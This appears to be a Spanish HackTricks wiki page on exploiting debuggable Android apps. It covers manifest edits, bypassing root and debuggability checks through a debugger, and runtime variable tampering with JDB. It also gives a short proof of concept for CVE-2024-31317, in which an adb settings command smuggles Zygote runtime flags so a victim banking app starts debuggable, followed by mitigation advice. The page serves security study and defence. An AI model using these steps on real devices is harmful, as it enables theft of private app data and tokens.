# Explotando una aplicación depurable

{{#include ../../banners/hacktricks-training.md}}

# **Evitando verificaciones de root y depurabilidad**

Esta sección de la publicación es un resumen de la publicación [**https://medium.com/@shubhamsonani/hacking-with-precision-bypass-techniques-via-debugger-in-android-apps-27fd562b2cc0**](https://medium.com/@shubhamsonani/hacking-with-precision-bypass-techniques-via-debugger-in-android-apps-27fd562b2cc0)

## Pasos para hacer que una aplicación de Android sea depurable y evitar verificaciones

### **Haciendo la aplicación depurable**

Contenido basado en https://medium.com/@shubhamsonani/hacking-with-precision-bypass-techniques-via-debugger-in-android-apps-27fd562b2cc0

1. **Descompilar el APK:**

- Utiliza la herramienta APK-GUI para descompilar el APK.
- En el archivo _android-manifest_, inserta `android:debuggable="true"` para habilitar el modo de depuración.
- Vuelve a compilar, firmar y zipalign la aplicación modificada.

2. **Instalar la aplicación modificada:**

- Usa el comando: `adb install <application_name>`.

3. **Recuperar el nombre del paquete:**

- Ejecuta `adb shell pm list packages –3` para listar aplicaciones de terceros y encontrar el nombre del paquete.

4. **Configurar la aplicación para esperar la conexión del depurador:**

- Comando: `adb shell am setup-debug-app –w <package_name>`.
- **Nota:** Este comando debe ejecutarse cada vez antes de iniciar la aplicación para asegurarse de que espera al depurador.
- Para persistencia, usa `adb shell am setup-debug-app –w ––persistent <package_name>`.
- Para eliminar todas las banderas, usa `adb shell am clear-debug-app <package_name>`.

5. **Preparar para la depuración en Android Studio:**

- Navega en Android Studio a _File -> Open Profile or APK_.
- Abre el APK recompilado.

6. **Establecer puntos de interrupción en archivos Java clave:**
- Coloca puntos de interrupción en `MainActivity.java` (específicamente en el método `onCreate`), `b.java` y `ContextWrapper.java`.

### **Evitando verificaciones**

La aplicación, en ciertos puntos, verificará si es depurable y también comprobará los binarios que indican un dispositivo con root. El depurador se puede usar para modificar la información de la aplicación, desactivar el bit de depurabilidad y alterar los nombres de los binarios buscados para evitar estas verificaciones.

Para la verificación de depurabilidad:

1. **Modificar la configuración de la bandera:**
- En la sección de variables de la consola del depurador, navega a: `this mLoadedAPK -> mApplicationInfo -> flags = 814267974`.
- **Nota:** La representación binaria de `flags = 814267974` es `11000011100111011110`, lo que indica que la "Flag_debuggable" está activa.

![https://miro.medium.com/v2/resize:fit:1400/1*-ckiSbWGSoc1beuxxpKbow.png](https://miro.medium.com/v2/resize:fit:1400/1*-ckiSbWGSoc1beuxxpKbow.png)

Estos pasos aseguran colectivamente que la aplicación pueda ser depurada y que ciertas verificaciones de seguridad puedan ser evitadas utilizando el depurador, facilitando un análisis o modificación más profundo del comportamiento de la aplicación.

El paso 2 implica cambiar un valor de bandera a 814267972, que se representa en binario como 110000101101000000100010100.

# **Explotando una vulnerabilidad**

Se proporcionó una demostración utilizando una aplicación vulnerable que contiene un botón y un textview. Inicialmente, la aplicación muestra "Crack Me". El objetivo es alterar el mensaje de "Try Again" a "Hacked" en tiempo de ejecución, sin modificar el código fuente.

## **Verificando la vulnerabilidad**

- La aplicación fue descompilada usando `apktool` para acceder al archivo `AndroidManifest.xml`.
- La presencia de `android_debuggable="true"` en el AndroidManifest.xml indica que la aplicación es depurable y susceptible a explotación.
- Vale la pena señalar que `apktool` se emplea únicamente para verificar el estado de depurabilidad sin alterar ningún código.

## **Preparando la configuración**

- El proceso implicó iniciar un emulador, instalar la aplicación vulnerable y usar `adb jdwp` para identificar los puertos de Dalvik VM que están escuchando.
- El JDWP (Java Debug Wire Protocol) permite la depuración de una aplicación que se ejecuta en una VM al exponer un puerto único.
- Se necesitó el reenvío de puertos para la depuración remota, seguido de la conexión de JDB a la aplicación objetivo.

## **Inyectando código en tiempo de ejecución**

- La explotación se llevó a cabo estableciendo puntos de interrupción y controlando el flujo de la aplicación.
- Se utilizaron comandos como `classes` y `methods <class_name>` para descubrir la estructura de la aplicación.
- Se estableció un punto de interrupción en el método `onClick`, y se controló su ejecución.
- Se utilizaron los comandos `locals`, `next` y `set` para inspeccionar y modificar variables locales, particularmente cambiando el mensaje "Try Again" a "Hacked".
- El código modificado se ejecutó utilizando el comando `run`, alterando con éxito la salida de la aplicación en tiempo real.

Este ejemplo demostró cómo se puede manipular el comportamiento de una aplicación depurable, destacando el potencial para explotaciones más complejas, como obtener acceso a la shell en el dispositivo en el contexto de la aplicación.

---

# 2024 – Convertir **cualquier** aplicación en un proceso depurable (CVE-2024-31317)

Incluso si el APK objetivo _no_ se envía con la bandera `android:debuggable`, investigaciones recientes mostraron que es posible forzar a **aplicaciones arbitrarias** a iniciarse con la bandera de tiempo de ejecución `DEBUG_ENABLE_JDWP` abusando de la forma en que Zygote analiza los argumentos de la línea de comandos.

*   **Vulnerabilidad:** Validación inadecuada de `--runtime-flags` suministrados a través del socket de comando de Zygote permite a un atacante que puede alcanzar `system_server` (por ejemplo, a través de la shell privilegiada `adb` que posee el permiso `WRITE_SECURE_SETTINGS`) inyectar parámetros adicionales. Cuando el comando elaborado es reproducido por `system_server`, la aplicación víctima se bifurca como _depurable_ y con un hilo JDWP escuchando. El problema se rastrea como **CVE-2024-31317** y se solucionó en el Boletín de Seguridad de Android de junio de 2024.
*   **Impacto:** Acceso completo de lectura/escritura al directorio de datos privados de **cualquier** aplicación (incluidas las privilegiadas como `com.android.settings`), robo de tokens, bypass de MDM, y en muchos casos un camino directo a la escalación de privilegios al abusar de los puntos finales IPC exportados del proceso ahora depurable.
*   **Versiones afectadas:** Android 9 a 14 antes del nivel de parche de junio de 2024.

## PoC rápida
```bash
# Requires: adb shell (device must be <2024-06-01 patch-level)
# 1. Inject a fake API-denylist exemption that carries the malicious Zygote flag
adb shell settings put global hidden_api_blacklist_exemptions "--runtime-flags=0x104|Lcom/example/Fake;->entryPoint:"

# 2. Launch the target app – it will be forked with DEBUG_ENABLE_JDWP
adb shell monkey -p com.victim.bank 1

# 3. Enumerate JDWP PIDs and attach with jdb / Android-Studio
adb jdwp               # obtain the PID
adb forward tcp:8700 jdwp:<pid>
jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=8700
```
> El valor elaborado en el paso 1 rompe el analizador fuera de la "ruta rápida" y agrega un segundo comando sintético donde `--runtime-flags=0x104` (`DEBUG_ENABLE_JDWP | DEBUG_JNI_DEBUGGABLE`) es aceptado como si hubiera sido proporcionado por el marco. Una vez que la aplicación se inicia, se abre un socket JDWP y trucos de depuración dinámica regulares (reemplazo de métodos, parcheo de variables, inyección en vivo de Frida, etc.) son posibles **sin modificar el APK o la imagen de arranque del dispositivo**.

## Detección y Mitigación

*   Parchear a **2024-06-01** (o posterior) nivel de seguridad – Google endureció `ZygoteCommandBuffer` para que los comandos subsiguientes no puedan ser contrabandeados de esta manera.
*   Restringir el acceso a `WRITE_SECURE_SETTINGS` / `shell` en dispositivos de producción. La explotación requiere este permiso, que normalmente solo lo tienen las aplicaciones privilegiadas de ADB o OEM.
*   En flotas gestionadas por EMM/MDM, hacer cumplir `ro.debuggable=0` y denegar el shell a través de `adb disable-verifier`.

---

## Referencias

- [https://medium.com/@shubhamsonani/hacking-with-precision-bypass-techniques-via-debugger-in-android-apps-27fd562b2cc0](https://medium.com/@shubhamsonani/hacking-with-precision-bypass-techniques-via-debugger-in-android-apps-27fd562b2cc0)
- [https://resources.infosecinstitute.com/android-hacking-security-part-6-exploiting-debuggable-android-applications](https://resources.infosecinstitute.com/android-hacking-security-part-6-exploiting-debuggable-android-applications)
- [https://rtx.meta.security/exploitation/2024/06/03/Android-Zygote-injection.html](https://rtx.meta.security/exploitation/2024/06/03/Android-Zygote-injection.html)
- [https://blog.flanker017.me/cve-2024-31317/](https://blog.flanker017.me/cve-2024-31317/)

{{#include ../../banners/hacktricks-training.md}}
